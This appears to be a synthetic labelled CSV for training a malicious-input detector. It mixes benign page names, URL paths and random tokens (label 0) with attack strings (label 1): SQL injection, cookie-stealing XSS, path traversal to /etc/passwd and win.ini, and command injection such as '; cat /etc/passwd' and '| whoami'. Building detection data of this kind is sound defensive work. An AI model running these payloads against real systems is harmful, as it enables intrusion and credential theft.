about,0
javascript:alert(1),1
/index?id=3585,0
7zZ94em3QQo9OLK,0
' OR 5=3 --,1
' OR 7=9 --,1
/home?session=48961,0
<script>var a=934;alert(a)</script>,1
profile,0
/search?id=4371,0
<script>var a=743;alert(a)</script>,1
../../../../etc/passwd,1
/login?id=1988,0
/user?id=9687,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 2=8 --,1
i2TJweZMkfDC4,0
4pwgeXcUuNiL4Tu,0
7yVXA3T5pg,0
home,0
eaCI7BUD3udB,0
/profile?session=49866,0
/contact?session=13995,0
1' o r '1'='1,1
/dashboard?session=79526,0
admin' --,1
admin'/* bypass */OR 1=1,1
sKSm0sT70sPo,0
| whoami,1
/register?id=9764,0
' OR 2=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
home,0
user,0
cart,0
' OR '1'='1,1
/profile?session=78353,0
1' o r '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
admin' --,1
<script>var a=286;alert(a)</script>,1
settings,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
GuHjKX99YyIv3WW,0
31JSP780De,0
XtWlg8MJ4cArA,0
<script>var a=268;alert(a)</script>,1
index,0
/search?session=28434,0
admin'/* bypass */OR 1=1,1
AhCpcQnb,0
/checkout?id=4949,0
<script>var a=552;alert(a)</script>,1
ab0eI588RLV2NiK,0
/blog?id=8703,0
/search?id=8304,0
l5oYEmhfEorN,0
<script>var a=827;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
1' o r '1'='1,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
1' o r '1'='1,1
' OR 9=3 --,1
1' o r '1'='1,1
<script>var a=858;alert(a)</script>,1
/login?id=6079,0
/login?session=20384,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=14;alert(a)</script>,1
' OR '1'='1,1
/user?id=2407,0
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
| whoami,1
javascript:alert(1),1
dashboard,0
' OR 1=1 --,1
<script>var a=311;alert(a)</script>,1
settings,0
rC69WgOhRRPuBCl,0
vg9He9C05yq,0
' OR 9=4 --,1
../../../../etc/passwd,1
login,0
' OR 8=1 --,1
<script>alert(document.cookie)</script>,1
' OR 9=8 --,1
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
blog,0
' OR 6=4 --,1
tN1VrWlGgf,0
/home?id=369,0
1' o r '1'='1,1
/about?id=1889,0
zpzG9eh3kDx8c,0
/contact?id=8595,0
contact,0
eH0xno2ZIoS,0
YHInzNbIMfjs,0
/about?id=7541,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?id=6264,0
/settings?session=84977,0
/profile?id=6087,0
JDpyMAjRHZ8,0
<script>var a=745;alert(a)</script>,1
/checkout?id=8261,0
<script>var a=21;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/register?session=50211,0
home,0
' OR 4=7 --,1
<script>var a=409;alert(a)</script>,1
U4Gldr5EyNiogNB,0
settings,0
about,0
1' o r '1'='1,1
/home?session=82300,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
user,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
dashboard,0
' OR 1=1 --,1
../../../../etc/passwd,1
; cat /etc/passwd,1
/login?id=7343,0
index,0
onerror=alert(1),1
/index?session=44599,0
admin'/* bypass */OR 1=1,1
9fRWYYaQA9rgml,0
f6ZWpjFQP1k,0
<script>alert(document.cookie)</script>,1
index,0
0sxZ7pu6CN,0
' OR 1=1 --,1
contact,0
javascript:alert(1),1
settings,0
/cart?session=26730,0
/cart?session=35033,0
<script>var a=588;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
CTjOE7sJe,0
onerror=alert(1),1
search,0
s E l E c T * f R o M a d m i n,1
/register?id=7406,0
/profile?id=4297,0
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
index,0
javascript:alert(1),1
' OR 7=6 --,1
5oSYH2pIaNYF,0
about,0
/register?id=5798,0
/about?id=9606,0
onerror=alert(1),1
' OR 8=2 --,1
/index?session=62329,0
/blog?session=19301,0
<script>var a=519;alert(a)</script>,1
isIMiU3B9RQUWJO,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=1 --,1
/contact?session=47408,0
<script>var a=329;alert(a)</script>,1
tWG9yrF2s,0
/search?id=9791,0
home,0
<script>alert(document.cookie)</script>,1
<script>var a=530;alert(a)</script>,1
/blog?session=15738,0
/settings?id=1722,0
index,0
' OR 8=3 --,1
/user?id=5449,0
/index?session=73080,0
admin'/* bypass */OR 1=1,1
settings,0
TRsuY0TQG,0
' OR 3=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=1506,0
<script>var a=859;alert(a)</script>,1
' OR 9=7 --,1
/search?session=50247,0
/contact?session=71623,0
' OR 5=8 --,1
' OR 1=1 --,1
<script>var a=209;alert(a)</script>,1
' OR 8=7 --,1
/blog?id=1125,0
login,0
; cat /etc/passwd,1
<script>var a=490;alert(a)</script>,1
login,0
<script>var a=2;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
/blog?session=47641,0
' OR 3=3 --,1
/profile?session=37963,0
' OR 1=1 --,1
<script>var a=827;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
user,0
../../../windows/win.ini,1
' OR 9=9 --,1
yYpotpr22EWtG,0
' OR 6=9 --,1
' OR 3=2 --,1
login,0
/settings?session=65944,0
1' o r '1'='1,1
/settings?id=2983,0
checkout,0
/register?session=22586,0
/user?session=51459,0
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
about,0
' OR 8=6 --,1
/register?session=12722,0
/user?id=1232,0
/about?id=3198,0
onerror=alert(1),1
dashboard,0
/settings?session=56792,0
VSpSxaWbm,0
1' o r '1'='1,1
' OR 7=8 --,1
<script>alert(document.cookie)</script>,1
| whoami,1
/settings?id=7413,0
/register?id=6892,0
login,0
<script>var a=787;alert(a)</script>,1
/about?id=7922,0
/contact?id=7551,0
/profile?id=5614,0
/profile?id=5771,0
../../../../etc/passwd,1
7eMeIUJdWRWSQU,0
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=8910,0
' OR 1=1 --,1
/user?id=9537,0
index,0
/search?session=53057,0
' OR '1'='1,1
dashboard,0
; cat /etc/passwd,1
cart,0
../../../windows/win.ini,1
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
javascript:alert(1),1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=1 --,1
<script>var a=316;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/register?id=8394,0
<script>var a=785;alert(a)</script>,1
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
/checkout?id=7243,0
onerror=alert(1),1
' OR '1'='1,1
<script>var a=547;alert(a)</script>,1
dtpkpVQwwkOJ,0
s E l E c T * f R o M a d m i n,1
<script>alert(document.cookie)</script>,1
dashboard,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
/contact?id=1614,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=7579,0
home,0
1' o r '1'='1,1
search,0
../../../../etc/passwd,1
/login?session=79048,0
PN4j1j9Z3s7Wr,0
; cat /etc/passwd,1
/dashboard?session=79997,0
' OR 4=5 --,1
<script>var a=120;alert(a)</script>,1
/login?session=76974,0
admin'/* bypass */OR 1=1,1
cart,0
LmkJCC2JaSjxGQ,0
settings,0
admin'/* bypass */OR 1=1,1
<script>var a=534;alert(a)</script>,1
<script>var a=712;alert(a)</script>,1
; cat /etc/passwd,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
/settings?session=87935,0
/user?session=92323,0
<script>var a=885;alert(a)</script>,1
admin' --,1
/about?session=95965,0
/settings?id=1465,0
/contact?id=6760,0
7jmbbK9X,0
/contact?id=5448,0
/cart?id=9071,0
<script>var a=479;alert(a)</script>,1
BJHJ6QeEwtMTrn,0
/checkout?session=60091,0
../../../../etc/passwd,1
onerror=alert(1),1
<script>var a=285;alert(a)</script>,1
../../../windows/win.ini,1
../../../../etc/passwd,1
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
' OR 1=1 --,1
03RcJWyXe9O,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
EuhlnilyuZUCq,0
' OR 9=2 --,1
search,0
/search?id=7524,0
admin%00' OR 1=1,1
<script>var a=326;alert(a)</script>,1
YvE3TOuVrcr,0
<script>var a=94;alert(a)</script>,1
/user?session=71454,0
/index?id=1272,0
user,0
/home?session=70057,0
<script>var a=404;alert(a)</script>,1
/about?session=71231,0
' OR '1'='1,1
login,0
<script>alert(document.cookie)</script>,1
blog,0
| whoami,1
/cart?session=75111,0
/index?session=23025,0
/checkout?session=77263,0
javascript:alert(1),1
' OR 2=8 --,1
Me4vin7Zs,0
/index?id=964,0
admin%00' OR 1=1,1
user,0
WxiIn3eRwc8cC,0
/cart?session=12198,0
| whoami,1
1' o r '1'='1,1
/about?session=23354,0
admin%00' OR 1=1,1
about,0
<script>var a=575;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/contact?session=46495,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
' OR 1=1 --,1
/checkout?session=70499,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=1 --,1
/cart?id=9042,0
XvutpGgbLTh5Z,0
<script>var a=319;alert(a)</script>,1
checkout,0
javascript:alert(1),1
uClP87manz,0
settings,0
admin%00' OR 1=1,1
/blog?id=9417,0
/search?session=37014,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 6=8 --,1
/index?session=91025,0
/search?session=82801,0
/cart?session=26040,0
' OR 1=1 --,1
<script>alert(document.cookie)</script>,1
/contact?id=9448,0
<script>var a=923;alert(a)</script>,1
/profile?id=803,0
s E l E c T * f R o M a d m i n,1
' OR 6=6 --,1
cart,0
KK6cytSaxjYq8,0
<script>var a=971;alert(a)</script>,1
/contact?id=999,0
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
/cart?id=9839,0
KGmeDjrGQlO,0
/cart?session=96244,0
javascript:alert(1),1
onerror=alert(1),1
lnif3Dit1Yflf,0
<script>var a=951;alert(a)</script>,1
/user?id=7228,0
dashboard,0
../../../windows/win.ini,1
/about?id=9668,0
profile,0
/profile?session=20471,0
; cat /etc/passwd,1
' OR 8=9 --,1
F0NLNCOdLwSICP,0
/blog?session=24982,0
fKxbzGzf,0
; cat /etc/passwd,1
7s7LWbzijeT5,0
' OR 8=9 --,1
/about?id=4975,0
/settings?id=7219,0
/index?id=6700,0
cart,0
' OR 4=8 --,1
/cart?id=2684,0
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
checkout,0
TYM1rRTEvcNMIM,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=574;alert(a)</script>,1
' OR 1=1 --,1
| whoami,1
/cart?session=86022,0
/register?id=3158,0
<script>var a=11;alert(a)</script>,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=264;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?id=9728,0
<script>var a=83;alert(a)</script>,1
javascript:alert(1),1
javascript:alert(1),1
/login?session=33318,0
' OR 7=8 --,1
; cat /etc/passwd,1
' OR '1'='1,1
<script>var a=466;alert(a)</script>,1
/cart?session=40148,0
O9ftaYzirzS,0
lEWLj9KWkjr9Wq,0
/register?id=44,0
/register?id=6752,0
' OR 1=3 --,1
<script>var a=293;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
; cat /etc/passwd,1
blog,0
<script>var a=348;alert(a)</script>,1
4s50y7pOkpyf,0
/contact?id=396,0
/user?session=26888,0
about,0
s E l E c T * f R o M a d m i n,1
' OR 7=8 --,1
/index?session=27960,0
../../../../etc/passwd,1
' OR 4=9 --,1
../../../../etc/passwd,1
/dashboard?id=947,0
onerror=alert(1),1
javascript:alert(1),1
/profile?id=5292,0
profile,0
i3PQIWyo02,0
<script>var a=704;alert(a)</script>,1
/index?session=64780,0
' OR 4=1 --,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
profile,0
../../../../etc/passwd,1
javascript:alert(1),1
opYAZEPobNchd4i,0
onerror=alert(1),1
/user?session=88713,0
' OR 1=1 --,1
home,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=603;alert(a)</script>,1
index,0
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 3=4 --,1
qEHc3MHX,0
/search?session=53029,0
admin' --,1
checkout,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
' OR 8=6 --,1
/index?session=38549,0
lCmCDkPEQGR1Tps,0
' OR 8=8 --,1
' OR '1'='1,1
V4o6wTgr,0
/about?id=4062,0
/index?session=54060,0
/search?session=91205,0
1XinHTCA4CaBLqJ,0
/profile?session=31838,0
' OR 9=4 --,1
profile,0
/user?session=70910,0
PQxK7uT9,0
wdV1D9i8Bb,0
' OR '1'='1,1
/dashboard?id=6522,0
PNEuxWKHW6vB,0
1' o r '1'='1,1
' OR 1=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?session=89852,0
<script>var a=71;alert(a)</script>,1
BkLjc1CcL0C,0
/profile?session=43662,0
profile,0
admin' --,1
<script>var a=268;alert(a)</script>,1
/home?id=1110,0
K659G2doejXQij,0
cart,0
' OR 1=1 --,1
login,0
ndcciinm4Yeu,0
blog,0
admin' --,1
/checkout?id=4956,0
<script>var a=770;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 3=2 --,1
user,0
/search?id=887,0
; cat /etc/passwd,1
user,0
/home?id=3262,0
<script>var a=428;alert(a)</script>,1
/home?session=71531,0
' OR 5=2 --,1
/home?session=14112,0
; cat /etc/passwd,1
/cart?id=4701,0
<script>var a=930;alert(a)</script>,1
/settings?id=3443,0
/settings?id=425,0
<script>alert(document.cookie)</script>,1
login,0
HenbbEd8,0
admin'/* bypass */OR 1=1,1
/blog?id=3976,0
' OR 2=9 --,1
/user?session=93532,0
<script>alert(document.cookie)</script>,1
about,0
/search?id=3406,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?id=1416,0
aottHSvP4j7qZ,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
rLXownCfDbxYplj,0
Fc46ZKJ3coPj6N,0
1' o r '1'='1,1
; cat /etc/passwd,1
checkout,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
/home?id=8374,0
zemkdFL2zsF,0
lFQhiXL7gv,0
/contact?session=60293,0
' OR 6=5 --,1
hvaGWwCJ4AaQFG,0
home,0
' OR 5=5 --,1
/blog?session=55150,0
<script>var a=705;alert(a)</script>,1
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
/about?id=9718,0
<script>alert(document.cookie)</script>,1
<script>var a=208;alert(a)</script>,1
1' o r '1'='1,1
IrB9p6iNULX,0
' OR 4=3 --,1
admin'/* bypass */OR 1=1,1
<script>var a=134;alert(a)</script>,1
; cat /etc/passwd,1
/dashboard?id=4718,0
1' o r '1'='1,1
/dashboard?id=9419,0
../../../../etc/passwd,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
/contact?id=3631,0
/index?session=53471,0
onerror=alert(1),1
search,0
/home?session=40929,0
' OR 6=9 --,1
s E l E c T * f R o M a d m i n,1
| whoami,1
/login?session=30341,0
/dashboard?id=5726,0
' OR 5=1 --,1
' OR 1=1 --,1
/user?session=98600,0
| whoami,1
/contact?id=4520,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
contact,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/cart?id=4309,0
javascript:alert(1),1
| whoami,1
/search?session=50565,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
register,0
' OR 8=9 --,1
QDFh4ZtX0JxxvB,0
/contact?session=80346,0
javascript:alert(1),1
cpUpkOiCXHa,0
../../../../etc/passwd,1
/contact?session=64403,0
' OR 7=2 --,1
' OR 1=1 --,1
<script>var a=403;alert(a)</script>,1
/index?id=7782,0
' OR 8=3 --,1
/register?session=89293,0
' OR '1'='1,1
admin%00' OR 1=1,1
' OR 4=1 --,1
/home?session=38937,0
/checkout?session=85991,0
' OR 9=9 --,1
QRajYpSpesuA,0
/register?session=88415,0
<script>var a=494;alert(a)</script>,1
| whoami,1
admin%00' OR 1=1,1
/index?session=53806,0
/search?session=42241,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/user?id=906,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
s E l E c T * f R o M a d m i n,1
/register?id=9618,0
blog,0
' OR 7=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?id=9730,0
admin%00' OR 1=1,1
/index?session=83960,0
<script>var a=596;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/search?id=7735,0
' OR 5=9 --,1
/index?id=9409,0
admin' --,1
<script>var a=160;alert(a)</script>,1
' OR '1'='1,1
oPcGqRoYZeVxaY,0
cart,0
register,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
about,0
1' o r '1'='1,1
Xd6ALhIBr0n,0
<script>var a=192;alert(a)</script>,1
/register?id=1439,0
' OR 1=8 --,1
/user?id=5006,0
../../../../etc/passwd,1
user,0
<script>var a=898;alert(a)</script>,1
' OR 4=1 --,1
/login?id=261,0
nLqBV7XP2mn7,0
1' o r '1'='1,1
GxdINBB9V9,0
; cat /etc/passwd,1
y4PJfy15SuALAJ,0
onerror=alert(1),1
/home?id=8257,0
' OR 2=7 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
javascript:alert(1),1
/blog?session=92069,0
E91YU76nA0,0
/dashboard?id=3732,0
oTQr7UugLcw6,0
/register?session=62142,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=587;alert(a)</script>,1
7giLR2azas4Xan,0
s E l E c T * f R o M a d m i n,1
admin%00' OR 1=1,1
/search?id=1403,0
SwydeEWCxk,0
; cat /etc/passwd,1
' OR 4=4 --,1
/checkout?id=6949,0
' OR 3=9 --,1
' OR 5=3 --,1
/contact?session=43551,0
<script>var a=288;alert(a)</script>,1
' OR 1=6 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=47;alert(a)</script>,1
lbBZ18oorqexJ,0
home,0
' OR '1'='1,1
search,0
/index?id=4274,0
' OR 1=7 --,1
user,0
zBAo1084PZY,0
/user?session=63636,0
contact,0
<script>var a=337;alert(a)</script>,1
/home?session=11653,0
search,0
<script>var a=730;alert(a)</script>,1
/contact?id=9334,0
SJeWH8WOveZQ51,0
admin%00' OR 1=1,1
/settings?id=5886,0
<script>var a=951;alert(a)</script>,1
/contact?session=42234,0
' OR 1=3 --,1
<script>var a=785;alert(a)</script>,1
onerror=alert(1),1
QqMNp94y4Z,0
admin'/* bypass */OR 1=1,1
hhDxxd4sC,0
/profile?session=49178,0
/index?id=7010,0
; cat /etc/passwd,1
../../../windows/win.ini,1
9hDsiqj0,0
/login?session=64560,0
0ipaIoGBxdpx,0
' OR 5=8 --,1
<script>var a=811;alert(a)</script>,1
9O24J8QQy7yPc3,0
/user?id=1379,0
blog,0
/about?id=9742,0
/login?id=5134,0
<script>var a=579;alert(a)</script>,1
' OR 1=1 --,1
PAZ7wHnX2PnjP,0
' OR 8=1 --,1
search,0
/blog?id=5029,0
1' o r '1'='1,1
9lCEnhTIUnmfx,0
/about?session=51699,0
' OR '1'='1,1
admin%00' OR 1=1,1
search,0
| whoami,1
NJcHBgeDytKj,0
/cart?id=5792,0
' OR 3=5 --,1
<script>var a=467;alert(a)</script>,1
settings,0
<script>var a=870;alert(a)</script>,1
<script>var a=718;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
dashboard,0
about,0
/about?session=22703,0
' OR '1'='1,1
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
/settings?id=5966,0
v3TNZE98,0
OfdPsVw7,0
/login?session=97928,0
<script>var a=403;alert(a)</script>,1
' OR 2=8 --,1
/login?session=33531,0
../../../../etc/passwd,1
<script>var a=743;alert(a)</script>,1
/settings?session=70978,0
<script>var a=248;alert(a)</script>,1
' OR 1=5 --,1
../../../../etc/passwd,1
/cart?id=1065,0
contact,0
' OR 4=5 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
CSBrxYiKu,0
<script>alert(document.cookie)</script>,1
/search?session=11131,0
../../../windows/win.ini,1
<script>var a=874;alert(a)</script>,1
' OR 2=3 --,1
SZETEAlYGw3xj9,0
settings,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR '1'='1,1
../../../../etc/passwd,1
/blog?session=79108,0
CnelzwcgJh,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=40;alert(a)</script>,1
/blog?id=8294,0
' OR 6=8 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=992;alert(a)</script>,1
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
contact,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
/index?session=17305,0
/blog?session=10846,0
/cart?id=7585,0
' OR 1=3 --,1
../../../windows/win.ini,1
search,0
admin' --,1
<script>var a=270;alert(a)</script>,1
/register?session=97174,0
' OR 3=9 --,1
<script>var a=404;alert(a)</script>,1
onerror=alert(1),1
/dashboard?session=41203,0
user,0
javascript:alert(1),1
ehE7uE7AJw,0
s E l E c T * f R o M a d m i n,1
/checkout?session=29796,0
<script>var a=892;alert(a)</script>,1
checkout,0
ZYeZe1qJq1k,0
/checkout?id=6710,0
s E l E c T * f R o M a d m i n,1
/dashboard?session=93891,0
/index?id=9510,0
settings,0
admin%00' OR 1=1,1
/user?id=7879,0
' OR 1=1 --,1
../../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
' OR 2=3 --,1
' OR 1=1 --,1
/user?id=4237,0
/profile?id=594,0
/register?session=76386,0
admin%00' OR 1=1,1
admin' --,1
javascript:alert(1),1
../../../../etc/passwd,1
; cat /etc/passwd,1
' OR 1=1 --,1
<script>var a=217;alert(a)</script>,1
/cart?id=1200,0
1' o r '1'='1,1
/user?id=1402,0
<script>var a=535;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=136;alert(a)</script>,1
nQAyTK0LSn82yxx,0
' OR 1=1 --,1
LThNN63cXAMsrc,0
' OR 4=6 --,1
' OR 1=1 --,1
' OR 9=5 --,1
/dashboard?session=49074,0
' OR 8=8 --,1
; cat /etc/passwd,1
/index?session=78302,0
index,0
' OR '1'='1,1
/register?id=1057,0
admin' --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?id=812,0
/blog?id=4133,0
1' o r '1'='1,1
YKAjlt3QD,0
/about?id=112,0
javascript:alert(1),1
QCJ3ChoRF0i7QaD,0
/search?session=24360,0
' OR 4=6 --,1
dashboard,0
<script>var a=849;alert(a)</script>,1
<script>var a=800;alert(a)</script>,1
about,0
/home?session=95706,0
| whoami,1
../../../windows/win.ini,1
checkout,0
home,0
index,0
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
; cat /etc/passwd,1
A5tO2n1it98M5,0
zKQCXg53Uj,0
s E l E c T * f R o M a d m i n,1
admin' --,1
/index?id=7378,0
javascript:alert(1),1
CBaKB1YQ,0
onerror=alert(1),1
' OR 1=1 --,1
/contact?id=6161,0
admin%00' OR 1=1,1
../../../windows/win.ini,1
' OR 2=9 --,1
../../../windows/win.ini,1
/index?id=9030,0
<script>var a=365;alert(a)</script>,1
/cart?id=8126,0
' OR '1'='1,1
admin'/* bypass */OR 1=1,1
profile,0
' OR 6=1 --,1
/index?session=86141,0
<script>var a=906;alert(a)</script>,1
/blog?session=89115,0
checkout,0
; cat /etc/passwd,1
2j4rmUnxK,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=693;alert(a)</script>,1
/contact?id=4257,0
| whoami,1
about,0
../../../windows/win.ini,1
javascript:alert(1),1
onerror=alert(1),1
admin'/* bypass */OR 1=1,1
/cart?session=11042,0
/user?session=41538,0
../../../windows/win.ini,1
' OR '1'='1,1
' OR 1=2 --,1
' OR 4=6 --,1
login,0
/about?session=17536,0
/settings?id=8216,0
' OR '1'='1,1
/contact?id=9438,0
contact,0
<script>alert(document.cookie)</script>,1
profile,0
search,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?id=4776,0
/register?session=49018,0
blog,0
<script>var a=7;alert(a)</script>,1
' OR '1'='1,1
DaUlqwMvLQiK,0
../../../../etc/passwd,1
admin' --,1
' OR 4=9 --,1
' OR 1=1 --,1
/cart?session=34756,0
| whoami,1
IyWLUuWRf4wfcL,0
1VcfVVB3xh2aCtb,0
/contact?id=2480,0
' OR 1=4 --,1
/dashboard?id=1908,0
/search?id=1369,0
/contact?id=8617,0
/checkout?session=72730,0
javascript:alert(1),1
/user?id=6511,0
/login?session=86629,0
/checkout?session=31126,0
<script>var a=452;alert(a)</script>,1
D6BGJ7XuW5gbq,0
/contact?session=61441,0
/cart?id=2697,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
dashboard,0
/checkout?id=2944,0
login,0
<script>alert(document.cookie)</script>,1
login,0
/dashboard?session=90824,0
<script>var a=927;alert(a)</script>,1
m2IueG8RL1QayL,0
/cart?session=88409,0
user,0
/user?session=75320,0
onerror=alert(1),1
' OR 3=2 --,1
; cat /etc/passwd,1
cart,0
/contact?id=1135,0
' OR 4=6 --,1
../../../windows/win.ini,1
7HIwaIYvXzs,0
' OR 5=7 --,1
ejoZEYBBHALxY,0
' OR 7=4 --,1
admin' --,1
onerror=alert(1),1
/cart?session=93195,0
' OR 4=2 --,1
dxyvFTcFhBs7Hq,0
' OR 1=1 --,1
/checkout?id=8031,0
onerror=alert(1),1
/about?session=58210,0
fopqQcLPSR4,0
<script>var a=937;alert(a)</script>,1
admin' --,1
../../../../etc/passwd,1
/settings?id=2956,0
/home?id=9795,0
/contact?session=31506,0
; cat /etc/passwd,1
/dashboard?session=59025,0
' OR 5=4 --,1
<script>var a=910;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?session=74532,0
' OR 1=1 --,1
admin%00' OR 1=1,1
/profile?id=2733,0
' OR 7=3 --,1
' OR 9=5 --,1
<script>var a=387;alert(a)</script>,1
| whoami,1
EGQlZa4pe,0
/checkout?session=37888,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
about,0
' OR 8=3 --,1
<script>alert(document.cookie)</script>,1
1KfSMzZLKk585,0
/search?id=3345,0
user,0
/register?session=47023,0
0cpQCaAESqEVTI,0
24tbEFSs,0
register,0
checkout,0
s E l E c T * f R o M a d m i n,1
9bi7hwOQScyF,0
qi9vea6bNSokEXt,0
kS3CJLTzJxUdBZL,0
contact,0
<script>alert(document.cookie)</script>,1
admin' --,1
/index?session=88472,0
search,0
7spZnfS7Tjjw0,0
' OR 3=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
/about?id=1696,0
/contact?session=78992,0
' OR 8=9 --,1
/dashboard?id=5482,0
| whoami,1
<script>var a=69;alert(a)</script>,1
' OR 3=2 --,1
/search?id=881,0
/search?id=72,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=58304,0
user,0
<script>var a=417;alert(a)</script>,1
goQdd59qVu6gq,0
/dashboard?session=20262,0
<script>var a=229;alert(a)</script>,1
bm4lnNpFZdF,0
5b8h5bglB3,0
settings,0
register,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?session=22343,0
/checkout?session=13070,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?session=20291,0
' OR 1=7 --,1
<script>var a=23;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/search?session=78238,0
/home?id=6828,0
s E l E c T * f R o M a d m i n,1
/profile?id=5177,0
home,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 1=1 --,1
| whoami,1
/contact?id=4676,0
/checkout?session=62119,0
<script>alert(document.cookie)</script>,1
/home?session=59046,0
/cart?session=97939,0
<script>var a=784;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/register?session=37317,0
/index?id=7910,0
login,0
blog,0
home,0
/about?session=99291,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
tz2NE5Tolr,0
/dashboard?id=715,0
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/contact?session=75409,0
2eln87Bw6j2W,0
javascript:alert(1),1
